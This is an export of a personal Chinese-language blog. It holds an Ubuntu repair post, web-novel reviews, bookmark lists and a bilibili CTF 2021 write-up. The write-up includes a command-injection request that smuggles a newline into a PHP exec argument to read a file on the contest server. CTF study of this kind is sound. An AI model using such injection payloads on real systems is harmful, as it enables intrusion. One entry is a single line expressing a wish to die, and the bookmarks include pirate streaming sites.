<li>尝试使用apt重新安装 -&gt; 但问题是，因为NetworkManager这个service也无法启动，用命令行连接wifi也报错segment fault。所以连不上网，apt等于没用<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /var/lib/apt/lists/lock</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /var/lib/dpkg/lock</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /var/lib/dpkg/lock-front-end</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /var/cache/apt/archives/lock</span><br><span class="line"><span class="built_in">sudo</span> dpkg --configure -a</span><br><span class="line"><span class="built_in">sudo</span> apt clean</span><br><span class="line"><span class="built_in">sudo</span> apt update --fix-missing</span><br><span class="line"><span class="built_in">sudo</span> apt install -f</span><br></pre></td></tr></table></figure>
<blockquote>
<p>credit to <a href="https://linuxhint.com/fix-broken-ubuntu-without-reinstalling/">https://linuxhint.com/fix-broken-ubuntu-without-reinstalling/</a></p>
</blockquote>
</li>
<li>尝试用系统u盘启动，寻找可能的repair选项 -&gt; 很可惜，没有，只有删除重装</li>
<li>尝试进入recover模式 -&gt; 失败，甚至dpkg也报segment fault错误</li>
</ol>
<h2 id="最后的方法"><a href="#最后的方法" class="headerlink" title="最后的方法"></a>最后的方法</h2><p><strong>重装系统</strong></p>
<p>然后想了想，既然我可以进入系统，而且我大部分的应用都是docker运行的。我只需要把配置文件复制出来，然后再重装系统不就完事了。</p>
<p>于是我就进系统. <code>fdisk -l</code> 找到u盘 <code>sudo mount /dev/sdc1 /mnt/usb</code> 挂载。把文件都备份好之后，再插上系统安装盘，重装系统.jpg</p>
<p>然后就好了</p>
<h2 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h2><ol>
<li>更新的时候别断电</li>
<li>做好备份</li>
<li>docker真tm的好用，要是我不是docker而是自己编译部署的话，那我麻了。</li>
</ol>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ubuntu</tag>
        <tag>碎碎念</tag>
      </tags>
  </entry>
  <entry>
    <title>活着好累</title>
    <url>/articles/life/huo-zhao-hao-lei/</url>
    <content><![CDATA[<p>活着好累，要是能死就好了</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
  </entry>
  <entry>
    <title>[小说简评] 宇宙飞行手册 (前115章)</title>
    <url>/articles/novel/yu-zhou-fei-xing-shou-ce-qian-115-zhang-jian-ping/</url>
    <content><![CDATA[<p>《宇宙飞行手册》前115章简评</p>
<p>这本书连载于起点中文网，目前尚未完结。</p>
<p>阅读感受包括剧透，但不包括剧情和任务的介绍。如果还未读过这本书，建议先阅读再参考此评价。</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在朋友Y的推荐下阅读了这本书，朋友Y的推荐语是：“如果你觉得前三章好看，那么你一定会喜欢这本书。”</p>
<p>我认为这话既对，又不尽然。</p>
<span id="more"></span>

<h2 id="Section-A"><a href="#Section-A" class="headerlink" title="Section A"></a>Section A</h2><p>不同于起点所谓的“黄金三章”，期望从第一章开始就吸引读者，这本书的前几章完全没有任何抓人眼球的剧情。相反，它的开头就像一个史诗故事的旁白，平淡却不乏吸引力。作者以相亲为切入点，短短几章便清晰而详细地描绘了一个星际大航海世界观的一角。</p>
<p>当然，该作品也有精彩之处。无论是王平安和安格丽首次搭档任务时的救人行动，还是第105章中的“爆破”企业号，这些故事单独拿出来都足以让人热血沸腾。尤其是在有前文铺垫的情况下，更加引人入胜。</p>
<p>因此，在剧情方面，这本书的前105章毫无疑问是完美的。</p>
<h2 id="Section-B"><a href="#Section-B" class="headerlink" title="Section B"></a>Section B</h2><p>剧情出色的同时，我们也能感受到作者在角色塑造上的用心。正因为有了丰满的角色形象，这些角色所参与的戏码才如此吸引人，打动人。</p>
<p>可以看出，作者花了大量篇幅描绘一个角色，即使这个角色只是众多配角中的一个（卢盈盈）。在描写卢盈盈时，无论是从主角的视角，还是从卢盈盈的家庭、朋友的角度，作者都从多个方面展示了这个角色。我们能清晰地感受到这个角色的性格和内心活动，所以当这个角色在剧情中做出某些行动时，我们会觉得：啊，她就是这样一个人。</p>
<p>对于主角更不用多说。</p>
<h2 id="Section-C"><a href="#Section-C" class="headerlink" title="Section C"></a>Section C</h2><p>写这篇文章时，我刚读完第115章。但我可能不太想继续看下去了。我的直觉（以及其他原因）告诉我，这本书注定是一个悲情的Bad Ending（让我想起了《边缘行者》）。虽然这个Bad End可能会很精彩，但我年纪大了看不了悲剧(笑。</p>
<p>当我读到第115章卢盈盈的角色和朋友表露心声时，我便能隐约感觉到，这本书不太可能有一个美好的结局。</p>
<p>一个完整的故事由许多小故事组成，而这些小故事中，除了主角之外，还会有一个小故事的主角。这个小故事的主线通常围绕着这个小故事主角和真主角展开。</p>
<p>每个故事都会有结局，小故事也不例外。无论这个小故事的主角最后是加入主角团继续冒险，还是在一旁做自己的事情，总会有一个小结局来描绘这个小故事的主角。</p>
<p>在我读过的绝大部分作品中，小故事的结局或多或少都暗示了全文的走向。</p>
<p>在第115章，卢盈盈这个小故事告一段落了：</p>
<p>-<br>卢盈盈有一个梦想，就是和主角王平安简简单单谈恋爱、结婚、共度一生。可惜作为主角的王平安并不愿意，他的目标是星辰大海，于是主角踏上了最前线。</p>
<p>卢盈盈为了主角，放弃了原本安稳的工作，毅然决然地加入了慰问团，为的就是能到前线去和主角见面，为的就是能追随主角的脚步。</p>
<p>可惜，卢盈盈永远追不上主角，她只是在追寻一个可能并不存在的幻影罢了。<br>-</p>
<p>相对的，主角也有一个梦想，就是前往半人马星座。当我读到这里时，我几乎已经能猜到后续剧情：在主角追求前往半人马星座的途中，他不断被各种麻烦事缠身，最后死在各个势力的混战中。</p>
<p>（当然这有点草率了，作者肯定有更好的方式让主角走向结局）</p>
<p>以上只是一个原因。</p>
<p>另一个原因是基于我对作者心思的揣摩——能写出这种开头的人，真的会为了取悦读者而写一个大团圆结局吗？ </p>
<p>这个故事就是套了一个喜剧外表的悲剧故事。 基本上所有的角色都是悲剧角色：</p>
<p>王平安的生母去世，生父换了多个妻子；安格丽的原生家庭为了入籍把女儿当商品；喜欢星空的兄妹因为各种阴谋丧命；</p>
<p>类似的例子还有很多。</p>
<p>想想就是了，有什么能让一个故事更加深入人心，更加震撼人心？我想，除了悲剧之外，别无他法。</p>
<h2 id="Section-D"><a href="#Section-D" class="headerlink" title="Section D"></a>Section D</h2><p>再来谈谈作者，这位作者完全不像一位网络文学作家，甚至可以说他不适合作为一个网络文学作者。在这个时代，网络文学作者或多或少都会为读者做一些妥协，而这位作者却是完完全全按照自己的想法在写，全身心投入。而不妥协的网络文学作者基本上不会有很好的成绩，因为他吸引的终究是那么一小部分和他能共鸣的人。</p>
<p>这有好处也有坏处。坏处在于，这本书只能与那些与作者电波相符的人对话。如果没有匹配上，那么读者会觉得作者就是一团糟，作者也会觉得读者就是一团糟。</p>
<p>但问题在于，<strong>有些故事对不上电波的人也会觉得很精彩，这就导致部分读者可能会觉得书的上下文割裂感有点大。</strong></p>
<p>总之，对于网络文学来说，这本书的作者似乎有中二病发作，有点太沉浸在自己创造的世界里了（不过这也是角色刻画和剧情表现能够引人入胜的原因吧，笑）。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>为了讲述Section CD，写了AB。</p>
<p>希望之后能狠狠地打我的脸。</p>
<p>Aynakeya</p>
<p>2023.04.27</p>
]]></content>
      <categories>
        <category>Novel</category>
      </categories>
      <tags>
        <tag>书评</tag>
      </tags>
  </entry>
  <entry>
    <title>[小说简评] 小世界其乐无穷 - 听日</title>
    <url>/articles/novel/xiao-shuo-shu-ping-xiao-shi-jie-qi-le-wu-qiong/</url>
    <content><![CDATA[<p>最近在看一本十分有趣的书《术士手册》，作者是听日的。总的来说，就是脑洞很大，其中每个人物都有属于他自己的特色。</p>
<p>但是这本书还没有完结，就不多评价了。</p>
<p>因为这本书的原因，又去找了找作者的其他书看了一看。于是就有了今天的书评。</p>
<p>《小世界其乐无穷》的剧情设定来说就是一个宅男收到了一个游戏机，他在里面通关的任何游戏都可以在不久后化成现实。基于这个设定，作者给出了居多的脑洞，而且每个都非常有意思。</p>
<p>从最开始的编排与主角无关人物，到后来主角成为游戏里的角色之一并开始亲手缔造未来，每一场游戏，以及游戏和现实的交汇都非常好看。确实能看出作者在脑洞这一方面的天赋。</p>
<p>但是，仅限前半本书。到后半本书之后（从颠倒世界开始），虽然游戏的部分依旧可以。但是这b作者开始写感情线了，还是写4个的后宫，你有这个能力么。</p>
<p>这突然转进的感情戏导致这本书前后的观感差距很大，有很大的割裂感。就前半部分好好的在说游戏，但是从颠倒世界这一卷开始就一转感情线，中间没有任何的转折，没有过渡，就突然开始谈恋爱了，而且还是走后宫那一派的。</p>
<p>其他的就不多说了。</p>
<p>2022.08.16<br>Aynakeya</p>
]]></content>
      <categories>
        <category>Novel</category>
      </categories>
      <tags>
        <tag>书评</tag>
      </tags>
  </entry>
  <entry>
    <title>404</title>
    <url>//404.html</url>
    <content><![CDATA[<h1 id="404"><a href="#404" class="headerlink" title="404"></a>404</h1><p>Oopsiee, there is no page here.</p>
<p>Try searching for your post.</p>
<details id="redirectDetails" style="display:none;" open>
<summary>Redirection Notice</summary>

<p>You are accessing a datetime-like URL. We&#39;ll redirect you in <span id="countdown">3</span> seconds. </p>
<p>Or <a href="#">click here</a> to redirect immediately.</p>
</details>

<script>
    let currentURL = window.location.pathname;
    let regexPattern = /^\/\d{4}\/\d{2}\/\d{2}\//;

    if (regexPattern.test(currentURL)) {
        let newPath = currentURL.replace(regexPattern, "/articles/");
        
        document.getElementById("redirectDetails").style.display = "block"; // Show the redirect notice
    
        // For manual redirection
        document.querySelector("#redirectDetails summary").nextElementSibling.lastElementChild.href = newPath;
    
        let countdown = 3;
    
        function countdown_to_redirect() {
          document.getElementById('countdown').textContent = countdown;
          if(countdown <= 0){
            window.location.href = newPath;
            return;
          }
          countdown -= 1;
          setTimeout(countdown_to_redirect, 1000);
        }
        countdown_to_redirect();
    }
</script>]]></content>
  </entry>
  <entry>
    <title>about</title>
    <url>/about/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Bookmarks</title>
    <url>/bookmarks/index.html</url>
    <content><![CDATA[<ul>
<li><a href="./cs/">计算机</a></li>
<li><a href="./acg/">二次元</a></li>
<li><a href="./ai/">AI</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>ctf-writeup</title>
    <url>/ctf-writeup/index.html</url>
    <content><![CDATA[<h1 id="pwn-gerenal"><a href="#pwn-gerenal" class="headerlink" title="pwn gerenal"></a>pwn gerenal</h1><ul>
<li><a href="/2021/11/18/ret2-dl-resolve-example-silent-rop/">return to dl resolve (ret2dlresolve)</a></li>
<li><a href="/2022/04/17/ctf/pwn-srop-power-of-sigreturn/">sigreturn</a></li>
</ul>
<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><ul>
<li><a href="./2023/picoctf">PicoCTF 2023</a></li>
<li><a href="./2023/bo1lersctf">Bo1lersCTF 2023</a></li>
<li><a href="./2023/picoctf">PicoCTF 2023</a></li>
<li><a href="./2023/kalmar">KalmarCTF 2023</a></li>
<li><a href="./2023/magpiectf">MagpieCTF 2023</a></li>
<li><a href="./2023/lactf">LACTF 2023</a></li>
</ul>
<h1 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h1><ul>
<li><a href="./2022/asisctfqual">AsisCTF Qualifications 2022</a></li>
<li><a href="./2022/sekaictf">SekaiCTF 2022</a></li>
<li><a href="./2022/csawqual/">CSAW ctf 2022 Qual</a></li>
<li><a href="./2022/cakectf/">Cake ctf 2022</a></li>
<li><a href="./2022/sdctf/">San Diego ctf 2022</a></li>
<li><a href="./2022/angstrom/">angstrom ctf 2022</a></li>
<li><a href="./2022/nahamcon/">nahamcon ctf 2022</a></li>
<li><a href="./2022/bo1lers">bo1lers ctf 2022</a></li>
<li><a href="./2022/tamuctf">tamu ctf 2022</a></li>
<li><a href="./2022/linectf">line ctf 2022</a></li>
<li><a href="./2022/utctf">ut ctf 2022</a></li>
<li><a href="./2022/magpiectf">magpie ctf 2022</a></li>
<li><a href="./2022/saplingctf/">maple ctf 2022</a></li>
</ul>
<h1 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h1><ul>
<li><a href="./2021/secconctf">seccon ctf</a></li>
<li><a href="./2021/hackerluctf">hacker.lu ctf</a></li>
<li><a href="./2021/bilibilictf">bilibili ctf 2021</a></li>
<li><a href="./2021/downunderctf">down under ctf</a></li>
<li><a href="./2021/trendmicroctf">trendmicro ctf 2021</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>[Category] title [CTF]</title>
    <url>/ctf-writeup/template.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>files: <a href="gambler_supreme">gambler_supreme</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>forgot</p>
]]></content>
  </entry>
  <entry>
    <title>MyJSProject</title>
    <url>/my-js-project/index.html</url>
    <content><![CDATA[<h1 id="这里是Javascript小作品的合集"><a href="#这里是Javascript小作品的合集" class="headerlink" title="这里是Javascript小作品的合集"></a>这里是Javascript小作品的合集</h1><p>我的js作品收藏夹~</p>
<hr>
<h3 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h3><ol>
<li><p><strong>Bilibili js书签工具箱~</strong></p>
<p>让你能够通过js书签下载视频，下载音乐，提取封面，以及av bv互转！</p>
<p> 链接: <a href="/static/projects/bilijstoolbox">点我</a></p>
</li>
<li><p><strong>黑历史： 不明所以的随机数</strong></p>
<p> 链接: <a href="/static/projects/rollpoint">点我</a></p>
</li>
</ol>
<hr>
<h3 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h3><ol>
<li><p><strong>黑历史1： 坦克打砖块</strong></p>
<p> 链接: <a href="/static/projects/tank">点我</a></p>
</li>
<li><p><strong>黑历史2： 贪吃蛇</strong></p>
<p> 链接: <a href="/static/projects/hungerysnake">点我</a></p>
</li>
<li><p><strong>黑历史3： 不知道啥东西</strong></p>
<p> 链接: <a href="/static/projects/keyshow">点我</a></p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>稀音服务开发日记 Scene Service Develop Diary</title>
    <url>/scene-series/index.html</url>
    <content><![CDATA[<h1 id="稀音服务开发日记"><a href="#稀音服务开发日记" class="headerlink" title="稀音服务开发日记"></a>稀音服务开发日记</h1><ul>
<li><a href="/articles/coding/my-approach-for-using-status-code-in-restful-api/">在 RESTful API 中如何选择合适的 HTTP 状态码</a></li>
<li><a href="/articles/coding/scene-microservice-develop-diary-0/">稀音微服务框架开发日记 - 基础架构</a></li>
<li><a href="/articles/coding/should-i-use-cache-in-repository-or-service-layer/">项目分层中，缓存应该放在哪儿</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>tags</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>二次元</title>
    <url>/bookmarks/acg/index.html</url>
    <content><![CDATA[<p><a href="https://bgm.tv/">Bangumi 番组计划</a></p>
<p><a href="https://bangumi.moe/">首页 - 萌番组</a></p>
<h1 id="动漫"><a href="#动漫" class="headerlink" title="动漫"></a>动漫</h1><ul>
<li><a href="https://mikanani.me/">蜜柑计划 - Mikan Project</a></li>
<li><a href="https://bgmlist.com/">番组放送</a></li>
<li><a href="https://www.ciyuanjie.cn/">次元街</a></li>
<li><a href="http://www.dudulu.moe/">嘟嘟噜二次元的理想乡 - 好用又好玩的追番网站</a></li>
</ul>
<h2 id="在线"><a href="#在线" class="headerlink" title="在线"></a>在线</h2><ul>
<li><a href="https://www.agemys.org/">在线动画 动漫下载 - AGE动漫</a></li>
<li><a href="http://www.yhdm.so/">樱花动漫－专注动漫的门户网站</a></li>
<li><a href="https://www.dqsj.cc/">大千视界_打驴动漫「无广告」所有樱花动漫番剧免费看</a></li>
<li><a href="https://omofun.tv/">OmoFun动漫视频网 - (￣﹃￣)~omO</a></li>
<li><a href="http://www.zzzfun.com/">ZzzFun动漫视频网 - (￣﹃￣)~zZZ</a></li>
<li><a href="https://anime1.me/">Anime1.me</a></li>
<li><a href="http://www.imomoe.la/">樱花动漫</a></li>
<li><a href="http://www.kakadm.com/">卡卡动漫</a></li>
<li><a href="http://m.imomoe.ai/">樱花动漫手机版</a></li>
<li><a href="http://feijisu7.com/">飞极速在线</a></li>
<li><a href="http://susudm.com/">速速动漫</a></li>
<li><a href="http://www.bimiacg.net/">M站 哔咪动漫</a></li>
<li><a href="https://hanime1.me/">Hanime1.me</a></li>
<li><a href="https://www.mikudm.com/">异世界动漫</a></li>
</ul>
<h1 id="漫画"><a href="#漫画" class="headerlink" title="漫画"></a>漫画</h1><ul>
<li><a href="https://www.mhgui.com/">漫画柜</a></li>
<li><a href="https://18comic.art/">18comic</a></li>
<li><a href="mox.moe">mox.moe</a>: 漫画 epub</li>
</ul>
<h1 id="轻小说"><a href="#轻小说" class="headerlink" title="轻小说"></a>轻小说</h1><ul>
<li><a href="https://www.wenku8.net/login.php">轻小说文库 - 最新最全的日本动漫轻小说在线阅读与下载基地</a></li>
<li><a href="https://www.linovelib.com/">哔哩轻小说</a></li>
<li><a href="http://205library.blogspot.com/">205 藏书馆</a></li>
<li><a href="https://www.acgndog.com/category/qingxiaoshuo">轻小说 – 次元狗</a></li>
<li><a href="https://mobinovels.com/">魔笔小说</a></li>
</ul>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul>
<li><a href="https://hmacg.cn/">H萌 - 你我共同的二次元家园！</a></li>
<li><a href="http://www.acgjc.com/">动漫无损音乐下载资讯站_ACG漫音社_专注分享二次元高品质音乐~</a></li>
<li><a href="https://xygalgame.com/">初音的青葱网发布页</a></li>
<li><a href="https://www.biliplus.com/">首页 - BiliPlus - ( ゜- ゜)つロ 乾杯~</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>AI Bookmarks</title>
    <url>/bookmarks/ai/index.html</url>
    <content><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><ul>
<li><a href="https://chat.openai.com/">Chat GPT</a></li>
<li><a href="https://www.chatpdf.com/">Chat PDF</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Computer Science Bookmarks</title>
    <url>/bookmarks/cs/index.html</url>
    <content><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><ul>
<li><a href="https://www.photopea.com/">photopea - Online PS</a></li>
<li><a href="https://carbon.now.sh/">Carbon - Code Image Generator</a></li>
<li><a href="https://jsoneditoronline.org/">Json Editor</a></li>
<li><a href="http://blog.luckly-mjw.cn/tool-show/m3u8-downloader/index.html">M3U8 下载</a></li>
<li><a href="https://jsonformatter.org/json-to-python">JSON To Python Class</a></li>
</ul>
<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><ul>
<li><a href="https://book.hacktricks.xyz/welcome/readme">hacktricks</a></li>
<li><a href="https://ctf-wiki.org/">ctf-wiki</a></li>
<li><a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">heap exploitation</a></li>
</ul>
<h1 id="ASM-Reverse-Engineering"><a href="#ASM-Reverse-Engineering" class="headerlink" title="ASM&#x2F;Reverse Engineering"></a>ASM&#x2F;Reverse Engineering</h1><ul>
<li><a href="https://trailofbits.github.io/ctf/vulnerabilities/references/X86_Win32_Reverse_Engineering_Cheat_Sheet.pdf">x86 cheat sheet</a></li>
<li><a href="http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html">x86_64 reference sheet</a></li>
<li><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">syscall table</a></li>
<li><a href="https://syscalls32.paolostivanin.com/">x86 syscall table</a></li>
</ul>
<h1 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h1><h2 id="书"><a href="#书" class="headerlink" title="书"></a>书</h2><ul>
<li><a href="http://books.studygolang.com/gopl-zh/">Go语言圣经</a></li>
<li><a href="https://www.cntofu.com/book/73/index.html">Go高级编程</a></li>
</ul>
<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><ul>
<li><a href="https://tour.go-zh.org/welcome/1">Go语言之旅</a></li>
<li><a href="https://www.topgoer.com/go%E5%9F%BA%E7%A1%80/">Go基础</a></li>
</ul>
<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><ul>
<li><a href="https://eddycjy.com/">煎鱼</a> 快速开发一点简单的应用</li>
<li><a href="https://golang.design/go-questions/">Go 程序员面试笔试宝典</a> golang内部实现</li>
<li><a href="https://mojotv.cn/404#Golang">mojotv&amp;Golang</a></li>
<li><a href="https://www.cyhone.com/go_internal/">Go源码刨析</a> <code>time/rate</code></li>
<li><a href="https://www.cntofu.com/book/73/index.html">Go高级编程</a></li>
</ul>
<h2 id="技术分享"><a href="#技术分享" class="headerlink" title="技术分享"></a>技术分享</h2><ul>
<li><a href="https://tech.meituan.com/">美团技术团队</a></li>
<li><a href="https://space.bilibili.com/393183630/article">bilibili技术</a></li>
</ul>
<h2 id="Etc"><a href="#Etc" class="headerlink" title="Etc"></a>Etc</h2><ul>
<li><a href="https://segmentfault.com/a/1190000039101378">由浅到深，入门Go语言Map实现原理</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>bilibili ctf 2021 writeup</title>
    <url>/ctf-writeup/2021/bilibilictf/bilibili-ctf-2021.html</url>
    <content><![CDATA[<h1 id="0x0-简介"><a href="#0x0-简介" class="headerlink" title="0x0 简介"></a>0x0 简介</h1><p>Bilibili CTF 简称 BTF，是一个丝毫没有含金量的ctf，狗都不玩。</p>
<p>你甚至可以纯复制粘贴来得到90分，属实拉垮。</p>
<p>活动地址: <a href="https://www.bilibili.com/blackboard/20211024.html">https://www.bilibili.com/blackboard/20211024.html</a></p>
<p>但是不管怎么样，我们来写一点可爱的writeup吧</p>
<span id="more"></span>

<h1 id="0x1-AES"><a href="#0x1-AES" class="headerlink" title="0x1 AES"></a>0x1 AES</h1><p><img data-src="/./images/2021-10-28_224747.jpg" alt="2021-10-28_224747.jpg"></p>
<p>猜一下，给了一个类似密码的东西，又给了一个类似加密后文本的字符串，那么就嗯破解就完事了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = &quot;e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364&quot;</span><br><span class="line">b = &quot;0408abca7deabb96a58f50471171b60e02b1a8dbd32db156&quot;</span><br><span class="line"># with open(&quot;a1&quot;,&quot;wb&quot;) as f:</span><br><span class="line">#     f.write(bytes.fromhex(b+a))</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">mode = AES.MODE_ECB</span><br><span class="line">cryptos = AES.new(b&quot;happy_1024_2233\x00&quot;, mode)</span><br><span class="line">plain_text = cryptos.decrypt(bytes.fromhex(a+b))</span><br><span class="line">print(plain_text)</span><br></pre></td></tr></table></figure>

<p>flag: a1cd5f84-27966146-3776f301-64031bb9</p>
<h1 id="0x2-Forensic"><a href="#0x2-Forensic" class="headerlink" title="0x2 Forensic"></a>0x2 Forensic</h1><p><img data-src="/./images/2021-10-28_225007.jpg" alt="2021-10-28_225007.jpg"></p>
<p>提示给的很明白了，没有含金量，直接在webpack里一翻就翻到了</p>
<p><img data-src="/./images/2021-10-28_225125.jpg" alt="2021-10-28_225125.jpg"></p>
<p>flag: 36c7a7b4-cda04af0-8db0368d-b5166480</p>
<h1 id="0x3-php-web"><a href="#0x3-php-web" class="headerlink" title="0x3 php web"></a>0x3 php web</h1><p>题目给了一段php的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /* </span><br><span class="line">        bilibili- ( ゜- ゜)つロ 乾杯~</span><br><span class="line">        uat: http://192.168.3.2/uat/eval.php</span><br><span class="line">        pro: http://security.bilibili.com/sec1024/q/pro/eval.php</span><br><span class="line">    */</span><br><span class="line">    $args = @$_GET[&#x27;args&#x27;];</span><br><span class="line">    if (count($args) &gt;3) &#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    for ( $i=0; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        if ( !preg_match(&#x27;/^\w+$/&#x27;, $args[$i]) ) &#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // /bin/2233 args2 args3</span><br><span class="line">    // todo: other filter</span><br><span class="line">    $cmd = &quot;/bin/2233 &quot; . implode(&quot; &quot;, $args);</span><br><span class="line">    exec($cmd, $out);</span><br><span class="line">    for ($i=0; $i&lt;count($out); $i++)&#123;</span><br><span class="line">        echo($out[$i]);</span><br><span class="line">        echo(&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过正则可以知道，所有args必须为非空格的字母或者数字，且最大长度为3</p>
<p>最后，这几个args会和&#x2F;bin&#x2F;2233 一起执行，执行的格式为 &#x2F;bin&#x2F;2233 args1 args2 args3</p>
<p>但是我们想要使用ls, 所以args1 要带上一个换行符, 换行符在url encode 后是%0a,</p>
<p>可以先用<code>args[]=1%0a&amp;args[]=ls</code>获取目录，然后用cat获取文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">a = requests.get(&quot;https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;args[]=cat&amp;args[]=passwd&quot;)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure>
<p>flag: 9d3c3014-6c6267e7-086aaee5-1f18452a</p>
<h1 id="0x4-sql-injection"><a href="#0x4-sql-injection" class="headerlink" title="0x4 sql injection"></a>0x4 sql injection</h1><p>麻了</p>
<p>flag: 3d5dd579-0678ef93-18b70cae-cabc5d51</p>
<h1 id="0x5-安卓逆向"><a href="#0x5-安卓逆向" class="headerlink" title="0x5 安卓逆向"></a>0x5 安卓逆向</h1><p>先用dex2jar 把apk转成jar文件</p>
<p>然后用jd-gui打开，在 MainActivity里找到账号密码的加密方式</p>
<p><img data-src="/./images/2021-10-28_230240.jpg" alt="2021-10-28_230240.jpg"></p>
<p><img data-src="/./images/2021-10-28_230317.jpg" alt="2021-10-28_230317.jpg"></p>
<p>加密方式a为做异或，b为base64。反向解密一下就完事了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># dex2jar get jar file</span><br><span class="line"># jd gui decompile</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_a(s:bytes,paramInt:int):</span><br><span class="line">    bs = bytearray(s)</span><br><span class="line">    for i in range(len(bs)):</span><br><span class="line">        bs[i] = bs[i] ^ paramInt</span><br><span class="line">    return bytes(bs)</span><br><span class="line"></span><br><span class="line">def decrypt_b(s:bytes):</span><br><span class="line">    return base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encoded1 = [78, 106, 73, 49, 79, 122, 65, 51, 89, 71,</span><br><span class="line">                  65, 117, 78, 106, 78, 109, 78, 122, 99, 55,</span><br><span class="line">                  89, 109, 85, 61]</span><br><span class="line">encoded2 = [89, 87, 66, 108, 79, 109, 90, 110, 78, 106,</span><br><span class="line">                  65, 117, 79, 109, 74, 109, 78, 122, 65, 120,</span><br><span class="line">                  79, 50, 89, 61]</span><br><span class="line">print(decrypt_a(decrypt_b(bytes(encoded1)),3))</span><br><span class="line">print(decrypt_a(decrypt_b(bytes(encoded2)),3))</span><br><span class="line">print((decrypt_a(decrypt_b(bytes(encoded1)),3)+b&quot;-&quot;+decrypt_a(decrypt_b(bytes(encoded2)),3)).decode())</span><br></pre></td></tr></table></figure>

<p>flag: 516834cc-50e448af-bcf9ed53-9ae4328e</p>
<h1 id="0x6-安卓逆向-so文件"><a href="#0x6-安卓逆向-so文件" class="headerlink" title="0x6 安卓逆向 .so文件"></a>0x6 安卓逆向 .so文件</h1><p>ida打开MyLib.so文件，发现all函数</p>
<p>满足一下条件:</p>
<ol>
<li>系统为x86且是安卓9<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;ro.product.cpu.abi&quot;,(3553400).to_bytes(0x8,&quot;little&quot;)) # x86</span><br><span class="line">print(&quot;ro.build.version.release&quot;,(57).to_bytes(0x8,&quot;little&quot;)) # 9</span><br></pre></td></tr></table></figure></li>
<li>存在&#x2F;data&#x2F;2233 这个文件</li>
<li>有读写权限</li>
</ol>
<p>那么这个flag就会写到&#x2F;data&#x2F;2233文件里</p>
<p><img data-src="/./images/2021-10-28_230949.jpg" alt="2021-10-28_230949.jpg"></p>
<p>所以解题方法就是找一个安卓9, x86的系统，然后运行就完事了。</p>
<p>具体过程如下</p>
